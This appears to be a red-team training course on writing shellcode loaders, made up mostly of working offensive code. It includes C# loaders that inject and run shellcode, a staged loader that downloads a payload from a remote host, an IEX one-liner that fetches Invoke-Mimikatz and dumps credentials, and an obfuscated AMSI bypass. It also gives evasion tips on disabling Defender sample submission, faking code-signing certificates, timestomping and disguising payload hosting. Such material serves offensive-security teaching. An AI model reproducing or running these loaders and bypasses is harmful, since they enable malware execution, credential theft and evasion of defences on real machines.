Version: 1.0.0.0
Title: LocalLoader
Description:
Company:
Product: LocalLoader
Copyright: Copyright ©  2025
</code></pre>
<h2><a class="header" href="#msbuildexe-csharp-c" id="msbuildexe-csharp-c"><em><strong>msbuild.exe (CSharp, C++)</strong></em></a></h2>
<pre><code class="language-code">msbuild buildapp.csproj -t:HelloWorld
msbuild mimidogz.sln /t:Build /p:Configuration=Release /p:Platform=x64
</code></pre>
<pre><code class="language-code">@echo off
set msBuildExe=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;
set solutionsFile=&quot;C:\TestProject\mySln.sln&quot;
rem Build the solutions:  
%msBuildExe% /t:Build /p:Configuration=Release /p:Platform=x64 %solutionsFile%
</code></pre>
<hr />
<h2><a class="header" href="#clexe-c-visual-studio" id="clexe-c-visual-studio"><em><strong>CL.exe (C)</strong></em> Visual Studio</a></h2>
<pre><code class="language-code">Developer Prompt Visual Studio
cl.exe hello.c /out:hello.exe /exe

git clone https://github.com/gentilkiwi/mimikatz.git

cl.exe /Zi /I inc\ mimikatz\modules\misc\kuhl_m_misc_citrix.c modules\kull_m_kernel.c 
modules\kull_m_memory.c modules\kull_m_minidump.c modules\kull_m_output.c 
modules\kull_m_process.c modules\kull_m_string.c lib\x64\ntdll.min.lib 
/link kernel32.lib user32.lib advapi32.lib shell32.lib crypt32.lib rpcrt4.lib vcruntime.lib ucrt.lib 
/entry:kuhl_m_misc_citrix_logonpasswords 
/subsystem:console
</code></pre>
<hr />
<p>Staged vs Stageless</p>
<hr />
<h1><a class="header" href="#a-note-on-compiling" id="a-note-on-compiling">A note on compiling</a></h1>
<p>without code optimisation, all imported functions are show. With code optimization, only virtuallalloc and exitprocess.</p>
<p>The command <code>cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c</code> is used to compile a C source file using the Microsoft Visual C++ (MSVC) compiler. Here's a breakdown of each part of the command:</p>
<ul>
<li>
<p><code>cl</code>: This is the command-line compiler for Microsoft Visual C++.</p>
</li>
<li>
<p><code>/Od</code>: This flag disables optimization. It ensures that the compiler does not perform any optimizations that might remove or alter the code, which is useful for debugging and ensuring that all function calls are preserved.</p>
</li>
<li>
<p><code>/Zi</code>: This flag generates complete debugging information. It creates a Program Database (PDB) file that contains debugging information, which is useful for debugging the executable with a debugger.</p>
</li>
<li>
<p><code>/Fe:local_loader.exe</code>: This flag specifies the name of the output executable file. In this case, it sets the output file name to <code>local_loader.exe</code>.</p>
</li>
<li>
<p>Local_loader_C.c: This is the name of the C source file to be compiled.</p>
</li>
</ul>
<p>Putting it all together, the command compiles the Local_loader_C.c source file into an executable named <code>local_loader.exe</code>, with optimizations disabled and debugging information included.</p>
<p>To run this command, you would typically open a Developer Command Prompt for Visual Studio and execute the command there. Here is an example of how you might run it:</p>
<pre><code class="language-sh">cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c
</code></pre>
<p>After running this command, you can use tools like Dependency Walker to inspect the import table of <code>local_loader.exe</code> and verify that all the expected functions are listed.</p>
<hr />
<pre><code class="language-bash">C:\Lab&gt;dumpbin /imports Local_loader_C.exe
Microsoft (R) COFF/PE Dumper Version 14.42.34436.0
Copyright (C) Microsoft Corporation.  All rights reserved.


Dump of file Local_loader_C.exe

File Type: EXECUTABLE IMAGE

  Section contains the following imports:

    KERNEL32.dll
             140017000 Import Address Table
             140020EC0 Import Name Table
                     0 time date stamp
                     0 Index of first forwarder reference

                         610 WaitForSingleObject
                         232 GetCurrentProcess
                         233 GetCurrentProcessId
                         103 CreateThread
                         5FF VirtualAlloc
                         654 WriteProcessMemory
                         4F5 RtlCaptureContext
                         4FD RtlLookupFunctionEntry
                         504 RtlVirtualUnwind
                         ...
</code></pre>
<p>IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;</p>
<p>$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true)</p>
<h1><a class="header" href="#lab---shellcode" id="lab---shellcode">Lab - Shellcode</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<blockquote>
<p>OPSEC HINT : Let's apply some basic best practices when we compile the following code</p>
<ol>
<li>add and icon file to the dotnet app.</li>
<li>add metadata</li>
<li>Remove comments</li>
<li>compile with CSC</li>
</ol>
</blockquote>
<p>When compiling the dotnet code you can specify the .net version</p>
<pre><code class="language-powershell">
</code></pre>
<p>We'll need the .Net Developer Pack 4.8, let's see if it is installed:</p>
<pre><code class="language-cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full&quot; /v Version
</code></pre>
<p>CSC.exe is located in &quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&quot;</p>
<blockquote>
<p>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.</p>
</blockquote>
<p>Let's generate a Havoc shellcode payload (on <code>KALI</code> using the Havoc GUI):</p>
<p>Screenshots + xxd (hexview) payload.</p>
<p>Switch to your windows and under <code>&quot;C:\THEV\Labs\LocalLoader&quot;</code> you'll find a csharp solution file - open that with Visual Studio 2022.</p>
<p>We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).</p>
<pre><code class="language-csharp">using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // (1) insert our shellcode
            byte[] shellCode = new byte[] { /* insert shellcode here */ };

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory
            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
</code></pre>
<hr />
<p>Here's a small shellcode formatter toos in powershell, it converts a binary file to csharp:</p>
<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
$fileContent = [IO.File]::ReadAllBytes($fileName)
#$fileContent
$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
$csharpformat | add-content ($fileName + &quot;.cs&quot;)
Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
</code></pre>
<hr />
<p>Hooka</p>
<p>Donut</p>
<h1><a class="header" href="#lab---basic-loader" id="lab---basic-loader">Lab - Basic Loader</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<blockquote>
<p>When building a shellcode loader, you can use any coding language, c, c++, c#, powershell, rust, golang and so on. In general, detection rates for languages like golang, rust and nim are lower, they are much harder to analyze and reverse than standard c or c# code. In this training we''l be using C as our language, as it is a low level programming language (no CLR that does JIT compiling like with C# or powershell), remember most windows API functions are written in C/C++ as well.</p>
</blockquote>
<h2><a class="header" href="#advantages-of-using-c-on-windows" id="advantages-of-using-c-on-windows">Advantages of Using C on Windows</a></h2>
<h3><a class="header" href="#direct-access-to-windows-api" id="direct-access-to-windows-api">Direct Access to Windows API:</a></h3>
<ul>
<li>Native integration with core Windows features like process management, file I/O, and security.</li>
<li>Low-level control over kernel objects, memory, and hardware for system-level tasks.</li>
</ul>
<h3><a class="header" href="#high-performance" id="high-performance">High Performance:</a></h3>
<ul>
<li>Extremely fast and efficient due to minimal runtime overhead.</li>
<li>No garbage collection, allowing full control over memory and reducing latency.</li>
</ul>
<h3><a class="header" href="#portability-and-compatibility" id="portability-and-compatibility">Portability and Compatibility:</a></h3>
<ul>
<li>Backward compatibility with older Windows versions.</li>
<li>Portable language that can be adapted for other operating systems with adjustments.</li>
</ul>
<h3><a class="header" href="#small-footprint" id="small-footprint">Small Footprint:</a></h3>
<ul>
<li>Lightweight programs with smaller memory and disk usage, ideal for resource-limited scenarios.</li>
</ul>
<h3><a class="header" href="#extensive-tooling-and-libraries" id="extensive-tooling-and-libraries">Extensive Tooling and Libraries:</a></h3>
<ul>
<li>Access to the Windows SDK, C headers, and libraries optimized for Windows development.</li>
<li>Support for third-party C libraries like OpenSSL and SQLite.</li>
</ul>
<h3><a class="header" href="#control-over-system-resources" id="control-over-system-resources">Control Over System Resources:</a></h3>
<ul>
<li>Fine-grained memory management (e.g., <code>malloc</code>, <code>free</code>) for optimization.</li>
<li>Direct use of Windows threading and synchronization APIs for efficient multitasking.</li>
</ul>
<p>To build our own shellcode loader we need 4 functions:</p>
<blockquote>
<p>VirtualAlloc (Kernel32.dll)
CreateRemoteThread (Kernel32.dll)
MarshallCopy
WaitForSingleObject (Kernel32.dll)</p>
</blockquote>
<p>Generate havoc shellcode/helloworld dialog</p>
<blockquote>
<p><em><strong>EXPLAIN P/INVOKE - D/INVOKE:</strong></em>
PINVOKE </p>
<p>https://pinvoke.net/</p>
<p>https://github.com/TheWover/DInvoke</p>
</blockquote>
<p>On Kali</p>
<pre><code>msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT=&quot;Successful Execution :)&quot; TITLE=&quot;CrimsonCORE&quot;  -f csharp -b '\x00\x0a\x0d\x20' 
</code></pre>
<pre><code>Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 367 (iteration=0)
x64/xor chosen with final size 367
Payload size: 367 bytes
Final size of csharp file: 1896 bytes
byte[] buf = new byte[367] {0x48,0x31,0xc9,0x48,0x81,0xe9,
0xd7,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
0xbb,0x24,0x95,0x1f,0xa0,0x28,0x38,0x25,0xc8,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xd8,0xdd,0x9e,
0x44,0xd8,0xc7,0xda,0x37,0xcc,0x59,0x1f,0xa0,0x28,0x79,0x74,
0x89,0x74,0xc7,0x4e,0xf6,0x60,0x09,0xf7,0xad,0x6c,0x1e,0x4d,
0xc0,0x60,0xb3,0x77,0xd0,0x6c,0x1e,0x4d,0x80,0x65,0x09,0xec,
0x80,0x2b,0x22,0x55,0xea,0x60,0xb3,0x57,0x98,0x6c,0xa4,0xdf,
0x0c,0x14,0x59,0x59,0xca,0x08,0xb5,0x5e,0x61,0xe1,0x35,0x64,
0xc9,0xe5,0x77,0xf2,0xf2,0x69,0x69,0x6d,0x43,0x76,0xb5,0x94,
0xe2,0x14,0x70,0x24,0x18,0x42,0x14,0x67,0xb8,0x23,0x3a,0x2a,
0x4d,0x56,0x95,0x1f,0xa0,0xa3,0xb8,0xad,0xc8,0x24,0x95,0x57,
0x25,0xe8,0x4c,0x42,0x80,0x25,0x45,0x5b,0x2b,0x68,0x18,0xae,
0x80,0x3c,0xdc,0x1e,0x70,0x78,0xdb,0x73,0x80,0xdb,0x5c,0x52,
0x91,0xe1,0x79,0xae,0xfc,0xac,0xdd,0x1e,0x76,0x60,0x09,0xe5,
0x89,0xe5,0x5c,0x12,0x0c,0x69,0x39,0xe4,0xf0,0xc4,0xe0,0xee,
0xec,0x2b,0x74,0x01,0xc0,0x61,0xac,0xce,0xd5,0xf0,0x60,0x61,
0x43,0x64,0xb1,0x56,0xa1,0xf8,0x5e,0x64,0x43,0x28,0xdd,0x5b,
0x2b,0x68,0x24,0x6c,0xc9,0xf4,0xd4,0x94,0xa4,0xa0,0x79,0x7d,
0x89,0x7c,0xcb,0x46,0xe8,0x29,0xe8,0x7f,0x89,0x7c,0xd4,0x46,
0xe1,0x72,0x70,0xa6,0x24,0x04,0xd4,0x4d,0x5f,0xc8,0x60,0x64,
0x91,0x7e,0xdd,0x94,0xb2,0xc1,0x73,0xda,0x37,0xdb,0xc8,0xf7,
0xab,0x28,0x38,0x25,0xbd,0x57,0xf0,0x6d,0x93,0x1a,0x16,0x41,
0xa4,0x48,0x95,0x46,0xe1,0x92,0x74,0x52,0xee,0x23,0x6a,0xca,
0xe9,0xef,0xf9,0x25,0xc8,0x24,0x95,0xf7,0xb8,0x28,0x38,0x25,
0x9b,0x51,0xf6,0x7c,0xc5,0x5b,0x4b,0x43,0xbd,0x48,0xb5,0x5a,
0xd8,0x4d,0x5b,0x50,0xbc,0x4d,0xfa,0x71,0x80,0x12,0x11,0x25,
0x92,0xcc,0x99,0x1f,0xa0,0x28,0x7b,0x57,0xa1,0x49,0xe6,0x70,
0xce,0x6b,0x77,0x77,0x8d,0x24,0xd4,0x47,0xe8,0x19,0xf1,0x64,
0x72,0x61,0x16,0x49,0xa7,0xd7,0xed,0x6d,0xf9,0xed,0xd4,0xa5,
0x50,0x9d,0x9a,0x73,0x37,0xf1,0x95,0x1f,0xa0,0x28,0x38,0x25,
0xc8};
</code></pre>
<pre><code>xxd --canonical meterpreter.exe | more  
</code></pre>
<p>Note on compiling:</p>
<p><img src="./images/assemblyinformation.jpg" alt="Screenshot" /></p>
<p>Convert the shellcode to a CSharp array:</p>
<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
$fileContent = [IO.File]::ReadAllBytes($fileName)
#$fileContent
$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
$csharpformat | add-content ($fileName + &quot;.cs&quot;)
Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
</code></pre>
<p>Load this shellcode into you basic loader template:</p>
<pre><code class="language-CSHARP">using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr GetCurrentProcess();

        static void Main()
        {
            // (1) retrieve shellcode from function
            byte[] shellCode = GetShellcode();

            // Print the shellcode to the screen
            Console.WriteLine(&quot;Shellcode: &quot; + BitConverter.ToString(shellCode));

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory using WriteProcessMemory
            IntPtr bytesWritten;
            bool result = WriteProcessMemory(GetCurrentProcess(), funcAddr, shellCode, (uint)shellCode.Length, out bytesWritten);

            if (!result)
            {
                Console.WriteLine(&quot;Failed to write shellcode to memory.&quot;);
                return;
            }

            Console.WriteLine($&quot;Successfully wrote {bytesWritten} bytes to memory.&quot;);

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        // Function to return the shellcode
        private static byte[] GetShellcode()
        {
            0x56,0x48,0x89,0xe6,...
        };
    }
}
</code></pre>
<blockquote>
<p>OPSEC TIP : Clear out the shellcode buffer after injecting it into memory (this becomes more revelevant when we encrypt/obfuscate our shellcode) to evade memory scanning.</p>
</blockquote>
<pre><code class="language-csharp">Array.Clear(buf, 0, buf.Length);
</code></pre>
<blockquote>
<p>OPSEC TIP : Remove comments from your code, and avoid using variables like &quot;buf&quot; and &quot;shellcode&quot;.</p>
</blockquote>
<blockquote>
<p>OPSEC TIP: <em><strong>DON'T use RWX permissions</strong></em>, split them up in RW and RX
the RW-to-RX approach enhances security by ensuring the memory is only executable when necessary. Extend the code to integrate with DNS-based key retrieval or other loader logic, ensuring all operations are performed securely. For example, after retrieving the XOR key, allocate memory as RW, write the decrypted shellcode, change to RX, and execute, minimizing exposure.</p>
<p>WHY? assignung RWX to a dynamically allocated memory basically scream &quot;HEY I'M DOING SOMETHING REALLY WEIRD!&quot; - EDR's will typically flag this and once a <code>thread</code> is created to the address of this memory space (= start the code in the memory region), they'll initiate a memory scan on the contents of that memory region - or simply just kill the process immediately. Also forensic analysts will flag this immediately and quite a lot om memory analysis tools (i.e. volatility) likewise will flag on this.</p>
</blockquote>
<p>Below you can see when we run our basic loader that ge can run a simple powershell tools that scans all running processes for RWX permissions that have a createthread associated with them:</p>
<pre><code class="language-powershell">.\get-injectedThread.ps1
</code></pre>
<p><img src="./images/lab_basic_rwx.jpg" alt="Screenshot" /></p>
<pre><code class="language-csharp">UInt32 PAGE_READWRITE = 0x04;
IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_READWRITE);
</code></pre>
<p>and</p>
<pre><code class="language-csharp">UInt32 PAGE_EXECUTE_READ = 0x20;
UInt32 oldProtect;
bool protectResult = VirtualProtect(funcAddr, (UInt32)shellCode.Length, PAGE_EXECUTE_READ, out oldProtect);
if (!protectResult)
{
    Console.WriteLine(&quot;Failed to change memory protection.&quot;);
    return;
}
</code></pre>
<blockquote>
<p>HIDE the console window</p>
</blockquote>
<pre><code class="language-CSharp">[DllImport(&quot;user32.dll&quot;)]
private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport(&quot;kernel32.dll&quot;)]
private static extern IntPtr GetConsoleWindow();
const int SW_HIDE = 0;

var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);
</code></pre>
<h1><a class="header" href="#modularity" id="modularity">MODULARITY</a></h1>
<blockquote>
<p>In order to keep our shellcode loader neatly organized we'll make it modular - so instead of just adding code to the main program - let's put our functions in seperate classes (.cs files) that we can simply call from main. This will allow us to keep adding functionality while keeping an oversight of where we are and what we're. doing</p>
</blockquote>
<h1><a class="header" href="#forensics-1" id="forensics-1">Forensics</a></h1>
<p>Get-InjectedThread</p>
<h1><a class="header" href="#lab---xor-loader" id="lab---xor-loader">Lab - XOR Loader</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<p>Let's make our loader more evasive by encoding our payload with XOR.</p>
<ol>
<li>Create a raw payload that pops up a messagebox, and host it on our kali machine.</li>
</ol>
<pre><code class="language-bash">cd /opt/msf/payloads
msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT=&quot;Successful Execution :)&quot; TITLE=&quot;CrimsonCORE&quot;  -f raw -b '\x00\x0a\x0d\x20' -o rawmsgbox.bin
updog2
</code></pre>
<ol start="2">
<li>Let's download the payload and encode it XOR, and convert it to a csharp array we can use in our loader</li>
</ol>
<h1><a class="header" href="#entropy" id="entropy">ENTROPY</a></h1>
<blockquote>
<p><em><strong>ENTROPY</strong></em> 
<em>DEFINITION</em>: Entropy indicates the randomness within a data set. Higher entropy inidcates higher randomness.
Files with high entropy (&gt;7.5) are typically blocked by AV/EDR when touching the disk.</p>
</blockquote>
<p><img src="./images/labxor_loader.jpg" alt="Screenshot" /></p>
<p>Let's check the entropy of our XORLoader. We can use sigcheck from the <code>systeminternals suite</code>.</p>
<pre><code class="language-powershell">sigcheck64.exe -a -h .\XLoader.exe
</code></pre>
<p>or </p>
<pre><code class="language-powershell">sigcheck64.exe -a XLoader.exe | FINDSTR /I entropy
</code></pre>
<p><img src="./images/labxor_sigcheck.jpg" alt="Screenshot" /></p>
<p>Our Entropy here is &quot;5&quot; - which is pretty low and shouldn't flag AV/EDR.</p>
<ul>
<li>LOGIC.NET / BABEL</li>
</ul>
<h1><a class="header" href="#fixing-entropy" id="fixing-entropy">Fixing Entropy</a></h1>
<ul>
<li><a href="https://github.com/gmh5225/shellcode-EntropyFix">https://github.com/gmh5225/shellcode-EntropyFix</a></li>
<li><a href="https://github.com/AnErrupTion/LoGiC.NET">https://github.com/AnErrupTion/LoGiC.NET</a>
-<a href="https://www.youtube.com/watch?v=Q2vazB6SYfg&amp;t=4042s">https://www.youtube.com/watch?v=Q2vazB6SYfg&amp;t=4042s</a></li>
</ul>
<h1><a class="header" href="#kleenscan" id="kleenscan">KLEENSCAN</a></h1>
<p><a href="https://kleenscan.com/scan_result/f76da10390c0a2c03755cde6f26a242c525589e15534c60d612a62aa27d2c9d9">https://kleenscan.com/scan_result/f76da10390c0a2c03755cde6f26a242c525589e15534c60d612a62aa27d2c9d9</a></p>
<p><img src="./images/labxor_klean.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#lazysign--timestomp" id="lazysign--timestomp">LAZYSIGN + TIMESTOMP</a></h1>
<p><a href="https://captmeelo.com//redteam/maldev/2022/11/07/cloning-signing.html">https://captmeelo.com//redteam/maldev/2022/11/07/cloning-signing.html</a></p>
<h1><a class="header" href="#lab---staged-loader" id="lab---staged-loader">Lab - Staged Loader</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<blockquote>
<p><em><strong>BEST PRACRICES</strong></em>:
By removing the payload from our loader, there is no malicious code that <em>static analysis</em> can detect. <em><strong>HOWEVER</strong></em>, by shifting the code from being hardcoded into the loader to external server, it provides more IOC's for dynamic/behavioural analysis. Therefore make sure that:</p>
<ol>
<li>Host your payload on a reputable server (onedrive, Dropbox, Akamai etc...)</li>
<li>Use an FQDN, not an IP address (i.e. key.crimsoncore.be instead of 192.168.100.25)</li>
<li>Use HTTPS to download the shellcode - the shellcode never touches disk, it gets loaded into the buffer of a program, but we want to evade network based detections</li>
<li>make the webrequest look legit (user agent, headers etc...)</li>
<li>Use a name for the shellcode that looks normal (i.e. not shellcode.bin but update.dat for example)</li>
</ol>
</blockquote>
<p>Advantages : Easy to change shellcodes (as they're hosted), harder to detect by static analysis.</p>
<pre><code class="language-csharp">using System;
using System.Runtime.InteropServices;
using System.Net;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport(&quot;user32.dll&quot;)]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            string payloadUrl = &quot;http://10.0.0.6:9090/demon.sc.x64.b64&quot;;
            byte[] shellCode;

            using (WebClient client = new WebClient())
            {
                // Add HTTP headers    
                client.Headers.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&quot;);
                client.Headers.Add(&quot;Accept&quot;, &quot;application/octet-stream&quot;);
                client.Headers.Add(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
                client.Headers.Add(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.9&quot;);
                client.Headers.Add(&quot;Referer&quot;, &quot;https://www.contoso.com/support/downloads/latest-updates&quot;);
                // Download the Base64-encoded string
                string base64String = client.DownloadString(payloadUrl);
                // Decode the Base64 string to bytes
                shellCode = Convert.FromBase64String(base64String);
            }

            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
</code></pre>
<h1><a class="header" href="#chapter-13---evasion" id="chapter-13---evasion">Chapter 1.3 - Evasion</a></h1>
<p>Tips and tricks</p>
<p>strings - HxD/xxd
entropy</p>
<p>IAT &amp; String obfuscation</p>
<h1><a class="header" href="#build-as-release-and-disable-optimization-debug-includes-symbols" id="build-as-release-and-disable-optimization-debug-includes-symbols">Build as release and disable optimization (debug includes symbols)</a></h1>
<h1><a class="header" href="#fake-certs" id="fake-certs">Fake Certs</a></h1>
<p>Add face code-signing certs
https://github.com/jfmaes/LazySign</p>
<h1><a class="header" href="#compilation-meta-data" id="compilation-meta-data">compilation meta data</a></h1>
<h1><a class="header" href="#renaming-functions" id="renaming-functions">Renaming functions</a></h1>
<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, EntryPoint =&quot;VirtualAlloc&quot;, SetLastError = false, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr, 
            UInt32 size, 
            UInt32 flAllocationType, 
            UInt32 flProtect);
</code></pre>
<p>Change to : </p>
<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, EntryPoint =&quot;VirtualAlloc&quot;, SetLastError = false, ExactSpelling = true)]
        private static extern IntPtr MemReserve(
            IntPtr lpStartAddr, 
            UInt32 size, 
            UInt32 flAllocationType, 
            UInt32 flProtect);
</code></pre>
<p>Entrypoint -&gt; Specific entrypoint in kernel32.dll basically creating an alias to the function
Add some options to evade AV -&gt; SetLastError, ExactSpelling</p>
<h1><a class="header" href="#base64-encoding" id="base64-encoding">Base64 Encoding</a></h1>
<h1><a class="header" href="#xor-encoding" id="xor-encoding">XOR Encoding</a></h1>
<h1><a class="header" href="#array-reversing" id="array-reversing">Array Reversing</a></h1>
<h1><a class="header" href="#syscalls" id="syscalls">Syscalls</a></h1>
<h1><a class="header" href="#unhooking" id="unhooking">Unhooking</a></h1>
<h1><a class="header" href="#litterbox--avred-forensics" id="litterbox--avred-forensics">Litterbox / Avred (Forensics)</a></h1>
<h2><a class="header" href="#1-qu1cksc0pe" id="1-qu1cksc0pe">1. Qu1ckSc0pe</a></h2>
<p><a href="https://github.com/CYB3RMX/Qu1cksc0pe">https://github.com/CYB3RMX/Qu1cksc0pe</a></p>
<p><img src="./images/litter_quick.jpg" alt="image" /></p>
<h2><a class="header" href="#2-detect-it-easy" id="2-detect-it-easy">2. Detect it Easy</a></h2>
<p><a href="https://github.com/horsicq/Detect-It-Easy/">https://github.com/horsicq/Detect-It-Easy/</a></p>
<p><img src="./images/litter_DIE.jpg" alt="image" /></p>
